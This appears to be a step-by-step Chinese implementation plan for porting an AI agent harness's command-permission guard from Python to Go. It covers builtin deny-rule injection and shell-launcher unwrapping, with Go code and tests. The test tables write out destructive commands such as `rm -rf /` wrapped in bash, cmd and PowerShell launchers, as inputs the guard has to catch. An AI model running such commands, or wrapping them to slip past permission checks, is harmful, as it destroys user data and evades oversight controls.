	if len(rules) < 18 {
		t.Fatalf("规则总数 = %d, want >= 18（17 内置 + 1 用户）", len(rules))
	}
	first, _ := rules[0].(map[string]any)
	if first["layer"] != "builtin" {
		t.Errorf("首条 layer = %v, want builtin（内置在前）", first["layer"])
	}
	last, _ := rules[len(rules)-1].(map[string]any)
	if last["id"] != "my_rule" {
		t.Errorf("末条 id = %v, want my_rule（用户在后）", last["id"])
	}
}

// TestInlinePackageCommandRules_剔除已有builtin层 测试重复调用不会叠加内置规则
func TestInlinePackageCommandRules_剔除已有builtin层(t *testing.T) {
	once := InlinePackageCommandRules(map[string]any{})
	twice := InlinePackageCommandRules(once)
	r1, _ := once["rules"].([]any)
	r2, _ := twice["rules"].([]any)
	if len(r1) != len(r2) {
		t.Errorf("二次注入后规则数 %d != %d，说明内置规则被重复叠加", len(r2), len(r1))
	}
}

// TestInlinePackageCommandRules_开关关闭 测试 package_builtin_rules=false 时不注入
func TestInlinePackageCommandRules_开关关闭(t *testing.T) {
	cfg := map[string]any{"package_builtin_rules": false, "rules": []any{}}
	got := InlinePackageCommandRules(cfg)
	rules, _ := got["rules"].([]any)
	if len(rules) != 0 {
		t.Errorf("开关关闭时规则数 = %d, want 0", len(rules))
	}
}

// TestInlinePackageCommandRules_不修改入参 测试不修改调用方传入的 map
func TestInlinePackageCommandRules_不修改入参(t *testing.T) {
	cfg := map[string]any{"rules": []any{}}
	_ = InlinePackageCommandRules(cfg)
	rules, _ := cfg["rules"].([]any)
	if len(rules) != 0 {
		t.Error("入参被修改，应深拷贝")
	}
}
```

- [ ] **Step 4: 实现 `builtin_rules.go`**

先写 package 头与结构：

```go
// Package toolguard 提供工具策略的规则加载与命令脱壳。
//
// 本包对齐 Python openjiuwen/harness/security/permission_engine/toolguard/ 下的
// builtin_rules.py（151 行）与 command_canonicalize.py（134 行）。判定主体
// （tool_policy.py / shell_ast.py / pattern_matchers.py）在父包 security 内，
// 已存在且已对齐；本包只补两个此前缺失的辅助模块。
//
// # 本包与父包的分工
//
//   - builtin_rules.go：把包内 YAML 的内置规则「注入」到调用方的配置里，
//     带 layer=builtin 标记。这是 ingest 阶段的职责——判定阶段不再 load YAML。
//   - command_canonicalize.go：shell 命令的 launcher 脱壳，让
//     `bash -c "rm -rf /"` 这类被包裹的命令能被锚定规则命中。
//
// 文件目录：
//
//	toolguard/
//	├── doc.go                      # 包文档
//	├── builtin_rules.go            # 内置规则注入（3 函数）
//	└── command_canonicalize.go     # launcher 脱壳（3 正则 + 4 函数）
//
// 对应 Python 代码：
//   - openjiuwen/harness/security/permission_engine/toolguard/builtin_rules.py
//   - openjiuwen/harness/security/permission_engine/toolguard/command_canonicalize.py
package toolguard

import (
	"strings"
	"sync"

	"github.com/uapclaw/uapclaw-go/internal/agentcore/harness/resources"
	"github.com/uapclaw/uapclaw-go/internal/common/logger"
)

// ──────────────────────────── 常量 ────────────────────────────

const logComponent = logger.ComponentAgentCore

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// validCommandRuleActions 命令规则允许的 action 取值
	validCommandRuleActions = map[string]struct{}{"ask": {}, "deny": {}, "allow": {}}
	// falseStrings 字符串型假值
	falseStrings = map[string]struct{}{"false": {}, "0": {}, "no": {}, "off": {}}
	// trueStrings 字符串型真值
	trueStrings = map[string]struct{}{"true": {}, "1": {}, "yes": {}, "on": {}}
	// commandRulesCacheMu 内置规则缓存锁
	commandRulesCacheMu sync.RWMutex
	// commandRulesCache 上次读取的内置规则（只读快照）
	commandRulesCache []map[string]any
	// commandRulesCachePath 缓存对应的 YAML 路径
	commandRulesCachePath string
	// commandRulesCacheMtime 缓存对应的文件 mtime
	commandRulesCacheMtime float64
	// commandRulesCacheLoaded 是否已加载过
	commandRulesCacheLoaded bool
)
```

然后实现三个函数：

```go
// ──────────────────────────── 导出函数 ────────────────────────────

// PackageBuiltinRulesEnabled 宿主是否启用包内 YAML 的内置规则。
//
// 该开关同时控制命令规则、sensitive_paths、net_urls 三者。
// 键缺失或值无法识别时默认开启。
//
// Python: package_builtin_rules_enabled(permissions)
func PackageBuiltinRulesEnabled(permissions map[string]any) bool {
	value, ok := permissions["package_builtin_rules"]
	if !ok || value == nil {
		return true
	}
	if b, isBool := value.(bool); isBool {
		return b
	}
	if s, isStr := value.(string); isStr {
		lowered := strings.ToLower(strings.TrimSpace(s))
		if _, isFalse := falseStrings[lowered]; isFalse {
			return false
		}
		if _, isTrue := trueStrings[lowered]; isTrue {
			return true
		}
	}
	return true
}

// LoadPackageCommandRules 返回包内 YAML 的原始命令规则。
//
// 返回的是只读快照，调用方不得修改。mtime 变化时自动重载。
//
// Python: load_package_command_rules()
func LoadPackageCommandRules() []map[string]any {
	yamlPath := resources.ResolveBuiltinRulesYAMLPath()
	if yamlPath == "" {
		parsed, err := resources.ParseBuiltinRules()
		if err != nil {
			logger.Warn(logComponent).
				Err(err).
				Msg("permission.command_rules.builtin_embed_parse_failed")
			return nil
		}
		return convertSecurityRules(parsed.Rules)
	}

	mtime := resources.GetFileModTime(yamlPath)
	commandRulesCacheMu.RLock()
	if commandRulesCacheLoaded && commandRulesCachePath == yamlPath && commandRulesCacheMtime == mtime {
		cached := commandRulesCache
		commandRulesCacheMu.RUnlock()
		return cached
	}
	commandRulesCacheMu.RUnlock()

	commandRulesCacheMu.Lock()
	defer commandRulesCacheMu.Unlock()
	// 双检：可能在等锁期间被其他 goroutine 填充
	if commandRulesCacheLoaded && commandRulesCachePath == yamlPath && commandRulesCacheMtime == mtime {
		return commandRulesCache
	}

	parsed, err := resources.ParseBuiltinRulesFromFile(yamlPath)
	if err != nil {
		logger.Warn(logComponent).
			Str("path", yamlPath).
			Err(err).
			Msg("permission.command_rules.yaml_read_failed")
		return nil
	}
	rules := convertSecurityRules(parsed.Rules)
	commandRulesCache = rules
	commandRulesCachePath = yamlPath
	commandRulesCacheMtime = mtime
	commandRulesCacheLoaded = true
	return rules
}

// InlinePackageCommandRules 把内置规则注入到配置的 rules 段。
//
// 内置规则带 layer=builtin 标记并排在用户规则之前；调用方配置里已有的
// builtin 层会被先剔除，避免重复调用时叠加。
//
// Python: inline_package_command_rules(permissions)
func InlinePackageCommandRules(permissions map[string]any) map[string]any {
	cfg := deepCopyPermissions(permissions)
	if !PackageBuiltinRulesEnabled(cfg) {
		return cfg
	}

	existing := listOfMaps(cfg["rules"])
	userRules := make([]map[string]any, 0, len(existing))
	for _, r := range existing {
		if layer, _ := r["layer"].(string); layer != "builtin" {
			userRules = append(userRules, r)
		}
	}

	packageRules := make([]map[string]any, 0, len(commandRulesCache))
	for _, raw := range LoadPackageCommandRules() {
		action := yamlCommandRuleAction(raw)
		if action == "" {
			continue
		}
		item := shallowCopyMap(raw)
		item["layer"] = "builtin"
		item["action"] = action
		packageRules = append(packageRules, item)
	}

	merged := make([]any, 0, len(packageRules)+len(userRules))
	for _, r := range packageRules {
		merged = append(merged, r)
	}
	for _, r := range userRules {
		merged = append(merged, r)
	}
	cfg["rules"] = merged
	return cfg
}
```

接着写非导出函数：

```go
// ──────────────────────────── 非导出函数 ────────────────────────────

// yamlCommandRuleAction 读取并校验规则的 action 字段。
// 缺失/非法/allow 都返回空串并打 WARN（allow 不允许出现在内置规则里）。
//
// Python: _yaml_action(item)
func yamlCommandRuleAction(item map[string]any) string {
	raw, ok := item["action"].(string)
	if !ok || strings.TrimSpace(raw) == "" {
		logger.Warn(logComponent).
			Interface("id", item["id"]).
			Msg("permission.command_rules.missing_action")
		return ""
	}
	action := strings.ToLower(strings.TrimSpace(raw))
	if _, valid := validCommandRuleActions[action]; !valid {
		logger.Warn(logComponent).
			Interface("id", item["id"]).
			Str("action", action).
			Msg("permission.command_rules.invalid_action")
		return ""
	}
	if action == "allow" {
		logger.Warn(logComponent).
			Interface("id", item["id"]).
			Msg("permission.command_rules.skip")
		return ""
	}
	return action
}

// convertSecurityRules 把 resources 的结构体规则转为 map 形式。
func convertSecurityRules(rules []resources.SecurityRule) []map[string]any {
	out := make([]map[string]any, 0, len(rules))
	for _, r := range rules {
		out = append(out, map[string]any{
			"id":          r.ID,
			"description": r.Description,
			"severity":    r.Severity,
			"match_type":  r.MatchType,
			"pattern":     r.Pattern,
			"tools":       toAnySlice(r.TargetTools),
			"action":      r.Action,
		})
	}
	return out
}

// deepCopyPermissions 深拷贝权限配置（rules 段逐项复制）。
func deepCopyPermissions(src map[string]any) map[string]any {
	if src == nil {
		return map[string]any{}
	}
	out := make(map[string]any, len(src))
	for k, v := range src {
		if k == "rules" {
			list := listOfMaps(v)
			copied := make([]any, 0, len(list))
			for _, item := range list {
				copied = append(copied, shallowCopyMap(item))
			}
			out[k] = copied
			continue
		}
		out[k] = v
	}
	return out
}

// listOfMaps 把 any 转为 []map[string]any，非列表返回 nil。
func listOfMaps(v any) []map[string]any {
	list, ok := v.([]any)
	if !ok {
		if already, okDirect := v.([]map[string]any); okDirect {
			return already
		}
		return nil
	}
	out := make([]map[string]any, 0, len(list))
	for _, item := range list {
		if m, isMap := item.(map[string]any); isMap {
			out = append(out, m)
		}
	}
	return out
}

// shallowCopyMap 浅拷贝一个 map。
func shallowCopyMap(src map[string]any) map[string]any {
	out := make(map[string]any, len(src))
	for k, v := range src {
		out[k] = v
	}
	return out
}

// toAnySlice 把 []string 转为 []any（YAML 序列化友好）。
func toAnySlice(items []string) []any {
	out := make([]any, 0, len(items))
	for _, s := range items {
		out = append(out, s)
	}
	return out
}
```

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/toolguard/ -v 2>&1 | tail -25
```

Expected: 全部 PASS。

> **注意**：`LoadPackageCommandRules` 的双检（RLock 查 → Lock 查）在 Go 里是标准写法，但**必须持有读锁时把返回值拷出**（`cached := commandRulesCache`），否则解锁后切片可能已被替换。上面代码已如此。

- [ ] **Step 5: 修复 R10——`tiered_policy.go` 的 builtin 来源**

把 `tiered_policy.go:131-160` 的 `EvaluateTieredPolicy` 开头改为：

```go
func EvaluateTieredPolicy(permissionConfig map[string]any, toolName string, toolArgs map[string]any) (PermissionLevel, string) {
	mode := parsePermissionMode(permissionConfig)

	toolsCfg := mapAnyField(permissionConfig, "tools")
	defaultsCfg := mapAnyField(permissionConfig, "defaults")
	rules := listAnyField(permissionConfig, "rules")
	approvalOverrides := listAnyField(permissionConfig, "approval_overrides")

	// 内置规则必须已在 config["rules"] 里（layer=builtin），由
	// PreparePermissionsForEngine 在 ingest 阶段注入。判定阶段不再 load YAML。
	builtinRules, userRules := splitByBuiltinLayer(rules)

	bl, blRule := baselineLevel(toolsCfg, toolName)
	if bl == PermissionLevelDeny {
		return PermissionLevelDeny, blRule
	}
	// ...（后续不变，但 invCtx 的 Rules 用 userRules）
```

并把 `invCtx` 的 `Rules: rules` 改为 `Rules: userRules`。

新增 `splitByBuiltinLayer`：

```go
// splitByBuiltinLayer 把规则列表按 layer=="builtin" 切成内置与用户两份。
//
// Python: builtin_rules = [r for r in dict_rules if r.get("layer") == "builtin"]
//         user_rules    = [r for r in dict_rules if r.get("layer") != "builtin"]
func splitByBuiltinLayer(rules []map[string]any) (builtin, user []map[string]any) {
	for _, r := range rules {
		if layer, _ := r["layer"].(string); layer == "builtin" {
			builtin = append(builtin, r)
		} else {
			user = append(user, r)
		}
	}
	return builtin, user
}
```

删除原来的 `builtinRules := getBuiltinSecurityRules()` 一行。

- [ ] **Step 6: 修复 `patterns.go` 的 prepare 缺口（R10 生产风险）**

`MergePermissionAllowRuleIntoPermissions` 里的 `perms` 拿的是 YAML 原始配置，必须先 prepare。改 `patterns.go:300-305`：

```go
func MergePermissionAllowRuleIntoPermissions(permissions map[string]any, toolName string, toolArgs map[string]any) (map[string]any, bool) {
	perms := utils.DeepCopyMap(permissions)
	// 判定前必须注入内置规则层：EvaluateTieredPolicy 只从 config["rules"]
	// 按 layer=="builtin" 切分，不再自行 load YAML（见 9.90b spec §12.5.3）。
	// 调用方传入的是 YAML 原始配置，未经 ingest，此处补一次。
	perms = prepareForEvaluation(perms)

	currentPermission, _ := EvaluateTieredPolicy(perms, toolName, toolArgs)
	// ...（后续不变）
```

新增 `prepareForEvaluation`（放在 `permission_engine.go`，因 `PreparePermissionsForEngine` 将定义在那里）：

```go
// prepareForEvaluation 对未经 ingest 的原始配置做一次内置规则注入。
//
// 与 PreparePermissionsForEngine 的差别：只做规则注入，不碰 file_guard /
// net_guard（那些需要 workspace_root 与 trusted_dirs，由引擎构造时处理）。
// 用于 persist 链路——那里的配置直接来自 YAML 文件。
func prepareForEvaluation(permissions map[string]any) map[string]any {
	if permissions == nil {
		return map[string]any{}
	}
	return toolguard.InlinePackageCommandRules(permissions)
}
```

> **注意**：`permission_engine.go` 需 import `toolguard` 子包。检查是否形成循环依赖——`toolguard` 只 import `resources` 与 `common/logger`，不 import `security`，**不会成环**。

- [ ] **Step 7: 修既有测试——补 builtin 层**

`tiered_policy_test.go` 有 14 处直接调 `EvaluateTieredPolicy`，其中依赖内置规则的用例（如 `rm -rf` 应 DENY）现在会失败。为每个构造配置的位置补一层注入：

```go
// 在测试文件顶部加辅助函数
// configWithBuiltin 给测试配置注入内置规则层（模拟 ingest 后的状态）。
func configWithBuiltin(cfg map[string]any) map[string]any {
	return toolguard.InlinePackageCommandRules(cfg)
}
```

把每个 `EvaluateTieredPolicy(config, ...)` 改为 `EvaluateTieredPolicy(configWithBuiltin(config), ...)`。

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ 2>&1 | tail -30
```

Expected: 全部 PASS。若某个用例仍失败，**逐个检查该用例是否本来就依赖旧行为**（例如断言「配置里没有 rules 时 fallback 到 ASK」——现在有了内置规则，可能命中 DENY）。对这些用例：若新行为是修正（更严），改断言并在测试注释里写明原因；若新行为是错误退化，说明 `InlinePackageCommandRules` 实现有问题。

- [ ] **Step 8: 修集成测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./tests/integration/agentcore/harness/security/ 2>&1 | head -30
```

Expected: 若有失败，按 Step 7 同样方式处理（`permission_merge_test.go` 的 8 处加上注入）。

- [ ] **Step 9: 全量回归**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep -E "^(FAIL|---)" | head -20
```

Expected: 无 FAIL。

- [ ] **Step 10: 写 `doc.go` 并提交**

```go
// Package toolguard 提供工具策略的规则加载与 shell 命令脱壳。
//
// 本包对齐 Python openjiuwen/harness/security/permission_engine/toolguard/ 下的
// builtin_rules.py（151 行）与 command_canonicalize.py（134 行）。判定主体
// （tool_policy.py / shell_ast.py / pattern_matchers.py）在父包 security 内，
// 已存在且已对齐；本包只补两个此前缺失的辅助模块。
//
// # 为什么内置规则要走 ingest 而不是判定期加载
//
// Python 的 evaluate_tiered_policy docstring 明写：「内置规则必须已内联进
// rules（layer: builtin）；判定路径不再 load YAML」。把加载放在判定期会导致：
// ① 每次判定都读文件（性能）；② 判定结果依赖文件系统状态（不可复现）；
// ③ 配置与规则来源分散，无法从一份 config 快照复现判定。
//
// 文件目录：
//
//	toolguard/
//	├── doc.go                      # 包文档
//	├── builtin_rules.go            # 内置规则注入（3 函数）
//	└── command_canonicalize.go     # launcher 脱壳（3 正则 + 4 函数）
//
// 对应 Python 代码：
//   - openjiuwen/harness/security/permission_engine/toolguard/builtin_rules.py
//   - openjiuwen/harness/security/permission_engine/toolguard/command_canonicalize.py
package toolguard
```

```bash
gofmt -l internal/agentcore/harness/security/toolguard/ internal/agentcore/harness/security/
git add internal/agentcore/harness/security/toolguard/ \
        internal/agentcore/harness/security/tiered_policy.go \
        internal/agentcore/harness/security/tiered_policy_test.go \
        internal/agentcore/harness/security/patterns.go \
        internal/agentcore/harness/security/permission_engine.go \
        tests/integration/agentcore/harness/security/permission_merge_test.go
git commit -m "feat(toolguard): 内置规则 ingest 注入 + 修复 R10 判定路径 load YAML

新增 builtin_rules.go 三函数：
- PackageBuiltinRulesEnabled：宿主开关，缺失默认开
- LoadPackageCommandRules：读 YAML 并缓存（mtime 失效）
- InlinePackageCommandRules：注入 layer=builtin 并排在用户规则前

同时修复 R10：EvaluateTieredPolicy 不再自行 getBuiltinSecurityRules()，
改为从 config['rules'] 按 layer=='builtin' 切分（对齐 Python 判定路径
不 load YAML 的约定）。patterns.go 的 MergePermissionAllowRule 传入的是
YAML 原始配置，未经 ingest，补 prepareForEvaluation 注入一次，否则该
路径会静默丢失全部内置规则。"
git show --stat HEAD
```

Expected: 8 个文件左右。

---

## Task 3a：`security/toolguard/command_canonicalize.go`

**Files:**
- Create: `internal/agentcore/harness/security/toolguard/command_canonicalize.go`
- Create: `internal/agentcore/harness/security/toolguard/command_canonicalize_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/toolguard/command_canonicalize.py`（134 行）
- Read: `/home/opensource/agent-core/tests/unit_tests/harness/security/test_command_canonicalize.py`（300+ 行）

- [ ] **Step 1: 读 Python 测试文件，抄出全部用例**

```bash
sed -n '1,120p' /home/opensource/agent-core/tests/unit_tests/harness/security/test_command_canonicalize.py
```

把每个 `assert canonicalize_shell_command_for_permission(x) == y` 抄成 Go 表驱动用例。至少覆盖：

- `cmd /c "rm -rf /"` → `rm -rf /`
- `cmd.exe /c 'del x'` → `del x`
- `pwsh -Command "rm x"` → `rm x`
- `powershell -c 'rm x'` → `rm x`
- `pwsh -NoProfile -Command "rm x"` → `rm x`（中间有其他开关）
- `bash -c "rm x"` → `rm x`
- `bash -lc 'rm x'` → `rm x`（`-lc` 组合开关）
- `/bin/bash -c "rm x"` → `rm x`（绝对路径 launcher）
- `cd d && bash -c "rm x"` → `cd d && rm x`（**空格还原**，不能粘成 `&&rm`）
- `a; sh -c 'rm y'` → `a; rm y`
- `echo bash -c 'rm'` → **原样返回**（纯空白前缀拒绝脱壳）
- `bash -c "rm x" extra` → `rm x extra`（bare 形式取到空白）
- 空串 → 空串
- 无 launcher 的命令 → 原样返回

- [ ] **Step 2: 写失败测试**

```go
package toolguard

import "testing"

// TestCanonicalizeShellCommandForPermission 测试 launcher 脱壳与不脱壳场景
func TestCanonicalizeShellCommandForPermission(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"cmd /c 双引号", `cmd /c "rm -rf /"`, "rm -rf /"},
		{"cmd.exe /c 单引号", `cmd.exe /c 'del x'`, "del x"},
		{"cmd /c bare", `cmd /c rm`, "rm"},
		{"pwsh -Command", `pwsh -Command "rm x"`, "rm x"},
		{"powershell -c", `powershell -c 'rm x'`, "rm x"},
		{"pwsh 带其他开关", `pwsh -NoProfile -Command "rm x"`, "rm x"},
		{"powershell.exe -NoLogo -c", `powershell.exe -NoLogo -c "rm x"`, "rm x"},
		{"bash -c", `bash -c "rm x"`, "rm x"},
		{"bash -lc 组合", `bash -lc 'rm x'`, "rm x"},
		{"bash -cl 组合", `bash -cl 'rm x'`, "rm x"},
		{"sh -c", `sh -c 'rm x'`, "rm x"},
		{"zsh -c", `zsh -c 'rm x'`, "rm x"},
		{"dash -c", `dash -c 'rm x'`, "rm x"},
		{"ash -c", `ash -c 'rm x'`, "rm x"},
		{"绝对路径 bash", `/bin/bash -c "rm x"`, "rm x"},
		{"引号包住的 launcher", `"/bin/bash" -c "rm x"`, "rm x"},
		{"分隔符后接 bash 空格还原", `cd d && bash -c "rm x"`, "cd d && rm x"},
		{"分号后接 sh", `a; sh -c 'rm y'`, "a; rm y"},
		{"纯空白前缀不脱壳", `echo bash -c 'rm'`, `echo bash -c 'rm'`},
		{"无 launcher 原样", `ls -la`, `ls -la`},
		{"空串", ``, ``},
		{"仅空白", `   `, `   `},
		{"嵌套只脱一层", `bash -c "bash -c 'rm x'"`, `bash -c 'rm x'`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := CanonicalizeShellCommandForPermission(c.in); got != c.want {
				t.Errorf("Canonicalize(%q) = %q, want %q", c.in, got, c.want)
			}
		})
	}
}

// TestStripFdAliasTokens 测试 fd 复制标记的移除
func TestStripFdAliasTokens(t *testing.T) {
	cases := []struct{ in, want string }{
		{"ls 2>&1", "ls "},
		{"ls >&2", "ls "},
		{"ls <3", "ls "},
		{"ls &1", "ls "},
		{"ls -la", "ls -la"},
		{"", ""},
	}
	for _, c := range cases {
		if got := StripFdAliasTokens(c.in); got != c.want {
			t.Errorf("StripFdAliasTokens(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestIsFdAliasToken 测试 fd 标记识别
func TestIsFdAliasToken(t *testing.T) {
	yes := []string{"2>&1", ">&2", "<3", "&1", " 2>&1 "}
	no := []string{"", "ls", "2>", "2>&1x", "x2>&1"}
	for _, s := range yes {
		if !IsFdAliasToken(s) {
			t.Errorf("IsFdAliasToken(%q) = false, want true", s)
		}
	}
	for _, s := range no {
		if IsFdAliasToken(s) {
			t.Errorf("IsFdAliasToken(%q) = true, want false", s)
		}
	}
}
```

- [ ] **Step 3: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/toolguard/ -run TestCanonicalize 2>&1 | head
```

Expected: `undefined: CanonicalizeShellCommandForPermission`。

- [ ] **Step 4: 实现三条正则 + 四个函数**

在 `command_canonicalize.go` 里，**先写正则**（RE2 兼容改造是核心难点）：

```go
package toolguard

import (
	"regexp"
	"strings"
)

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// cmdLauncherRe 匹配 `cmd /c <payload>` 形式的 launcher。
	// 对应 Python _CMD_LAUNCHER_RE（去掉了 (?x) 注释，Go RE2 不支持 verbose 模式）。
	cmdLauncherRe = regexp.MustCompile(`(?i)\b(?:cmd(?:\.exe)?)\s+(?://c|/c)\s+(?:"(?P<dq>(?:\\.|[^"\\])*)"|'(?P<sq>(?:\\.|[^'\\])*)'|(?P<bare>\S+))`)

	// psLauncherRe 匹配 `pwsh|powershell [-开关]* -Command|-c <payload>`。
	psLauncherRe = regexp.MustCompile(`(?i)\b(?:pwsh|powershell(?:\.exe)?)(?:\s+-{1,2}[A-Za-z][A-Za-z-]*)*\s+(?:-Command|-c)\s+(?:"(?P<dq>(?:\\.|[^"\\])*)"|'(?P<sq>(?:\\.|[^'\\])*)'|(?P<bare>\S+))`)

	// shLauncherReStart 匹配**行首**的 POSIX shell launcher。
	// 原 Python 用变长 look-behind `(?:^|(?<=[;&|()]))\s*`，RE2 不支持 look-around，
	// 故拆成两条正则：本条件行首，shLauncherReSep 处理分隔符后。
	shLauncherReStart = regexp.MustCompile(`(?i)^\s*(?:"(?:[^"]*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?"|'(?:[^']*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?'|(?:[^\s;&|()]*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?)(?:\s+-{1,2}[A-Za-z][A-Za-z-]*)*\s+-[A-Za-z]*c[A-Za-z]*\s+(?:"(?P<dq>(?:\\.|[^"\\])*)"|'(?P<sq>(?:\\.|[^'\\])*)'|(?P<bare>\S+))`)

	// shLauncherReSep 匹配 `; & | ( )` 分隔符后（含任意空白）的 POSIX shell launcher。
	// 捕获组 sep 保存分隔符与空白，替换时原样保留。
	shLauncherReSep = regexp.MustCompile(`(?i)(?P<sep>[;&|()]\s*)(?:"(?:[^"]*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?"|'(?:[^']*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?'|(?:[^\s;&|()]*[\\/])?(?:bash|sh|zsh|dash|ash)(?:\.exe)?)(?:\s+-{1,2}[A-Za-z][A-Za-z-]*)*\s+-[A-Za-z]*c[A-Za-z]*\s+(?:"(?P<dq>(?:\\.|[^"\\])*)"|'(?P<sq>(?:\\.|[^'\\])*)'|(?P<bare>\S+))`)

	// fdAliasTokenRe 匹配 fd 复制标记
	fdAliasTokenRe = regexp.MustCompile(`(?<!\S)(?:\d+>&\d+|>&\d+|<\d+|&\d+)(?!\S)`)

	// leadingSeparatorsRe 匹配行首的空白与分隔符
	leadingSeparatorsRe = regexp.MustCompile(`^[\s;&|()]+`)
)
```

> 🔴 **RE2 兼容性问题**：`fdAliasTokenRe` 用了 look-around `(?<!\S)` / `(?!\S)`，**RE2 不支持**。改写为：
>
> ```go
> fdAliasTokenRe = regexp.MustCompile(`(^|[\s])(\d+>&\d+|>&\d+|<\d+|&\d+)([\s]|$)`)
> ```
>
> 并用 `ReplaceAllStringFunc` 手工判断边界。**Step 5 会给出完整实现。**

- [ ] **Step 5: 实现四个函数（含 RE2 改造）**

```go
// ──────────────────────────── 导出函数 ────────────────────────────

// CanonicalizeShellCommandForPermission 返回权限视图的命令副本：脱掉一层 launcher。
//
// 识别三类 launcher：cmd /c、pwsh|powershell -Command|-c、POSIX shell
// （bash/sh/zsh/dash/ash）带 -c 类开关。残留 launcher 会让锚定通配符规则
// （如 `rm *`）与 shell 正则前缀匹配不到内层命令，因此权限视图必须穿透它。
// 脱壳后残留的行首分隔符会被去掉；含真实命令的前缀（如 `cd d && ...`）保留。
//
// 不修改用于执行的 tool_args。不为已损坏的路径补反斜杠。
//
// Python: canonicalize_shell_command_for_permission(command)
func CanonicalizeShellCommandForPermission(command string) string {
	text := strings.TrimSpace(command)
	if text == "" {
		return text
	}

	// 顺序固定：cmd → pwsh → sh。任一命中即返回，只脱一层。
	if out, ok := unwrapOnce(cmdLauncherRe, text, false); ok {
		return stripLeadingSeparators(strings.TrimSpace(out))
	}
	if out, ok := unwrapOnce(psLauncherRe, text, false); ok {
		return stripLeadingSeparators(strings.TrimSpace(out))
	}
	if out, ok := unwrapOnce(shLauncherReStart, text, false); ok {
		return stripLeadingSeparators(strings.TrimSpace(out))
	}
	if out, ok := unwrapOnce(shLauncherReSep, text, true); ok {
		return stripLeadingSeparators(strings.TrimSpace(out))
	}
	return text
}

// StripFdAliasTokens 移除 stderr/stdout 的 fd 复制标记（如 2>&1）。
//
// Python: strip_fd_alias_tokens(command)
func StripFdAliasTokens(command string) string {
	if command == "" {
		return command
	}
	// RE2 不支持 look-around，用「消费边界字符再放回」的方式实现。
	var b strings.Builder
	b.Grow(len(command))
	i := 0
	for i < len(command) {
		// 找到当前位置起的一个 token 结束位置
		j := i
		for j < len(command) && !isSpaceByte(command[j]) {
			j++
		}
		token := command[i:j]
		if IsFdAliasToken(token) {
			// 跳过该 token；若其前有空格，一并跳过（Python 的正则吃掉 token 本身）
			i = j
			continue
		}
		b.WriteString(token)
		// 保留 token 后的空白
		for j < len(command) && isSpaceByte(command[j]) {
			b.WriteByte(command[j])
			j++
		}
		i = j
	}
	return b.String()
}

// IsFdAliasToken 判定一个 token 是否为 fd 复制标记。
//
// Python: is_fd_alias_token(token)
func IsFdAliasToken(token string) bool {
	text := strings.TrimSpace(token)
	if text == "" {
		return false
	}
	// 对应 Python 的 re.fullmatch(r"(?:\d+>&\d+|>&\d+|<\d+|&\d+)", text)
	return fdAliasFullRe.MatchString(text)
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// unwrapOnce 用给定正则脱一层 launcher，keepSep 为真时保留 sep 命名组。
func unwrapOnce(re *regexp.Regexp, text string, keepSep bool) (string, bool) {
	loc := re.FindStringSubmatchIndex(text)
	if loc == nil {
		return "", false
	}
	// 只处理第一次匹配
	names := re.SubexpNames()
	var dq, sq, bare, sep string
	for idx, name := range names {
		if idx == 0 || name == "" {
			continue
		}
		start, end := loc[2*idx], loc[2*idx+1]
		if start < 0 || end < 0 {
			continue
		}
		val := text[start:end]
		switch name {
		case "dq":
			dq = val
		case "sq":
			sq = val
		case "bare":
			bare = val
		case "sep":
			sep = val
		}
	}
	inner := dq
	if inner == "" {
		inner = sq
	}
	if inner == "" {
		inner = bare
	}
	stripped := strings.TrimSpace(inner)

	launcherInner := stripped
	// 对应 Python _launcher_inner：若匹配起点是空格/制表符则还原一个空格。
	// _SH_LAUNCHER_RE 用 \s* 消耗了分隔符后的空白，不还原会粘成 `&&rm`。
	matchedText := text[loc[0]:loc[1]]
	if !keepSep && len(matchedText) > 0 && (matchedText[0] == ' ' || matchedText[0] == '\t') {
		launcherInner = " " + stripped
	}

	prefix := text[:loc[0]]
	suffix := text[loc[1]:]
	return prefix + sep + launcherInner + suffix, true
}

// stripLeadingSeparators 去掉行首的空白与分隔符；全为空时返回原串。
func stripLeadingSeparators(command string) string {
	stripped := leadingSeparatorsRe.ReplaceAllString(command, "")
	if stripped == "" {
		return command
	}
	return stripped
}

// isSpaceByte 判定字节是否为空白。
func isSpaceByte(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\r'
}
```

补充一个全局正则（用于 `IsFdAliasToken` 的 fullmatch 语义）：

```go
	// fdAliasFullRe 全匹配版本的 fd 标记（对应 Python 的 re.fullmatch 单模式）
	fdAliasFullRe = regexp.MustCompile(`^(?:\d+>&\d+|>&\d+|<\d+|&\d+)$`)
```

- [ ] **Step 6: 运行测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/toolguard/ -run 'TestCanonicalize|TestStrip|TestIsFd' -v 2>&1 | tail -40
```

Expected: 全部 PASS。

**若「分隔符后接 bash 空格还原」失败**（得到 `cd d &&rm x` 而非 `cd d && rm x`）：说明 `shLauncherReSep` 的 `sep` 组没吃住空白，或 `unwrapOnce` 的拼接顺序有误。检查：(1) `(?P<sep>[;&|()]\s*)` 里 `\s*` 是否包含空格；(2) `prefix + sep + launcherInner + suffix` 中 `launcherInner` 不应再加空格（sep 已含）。

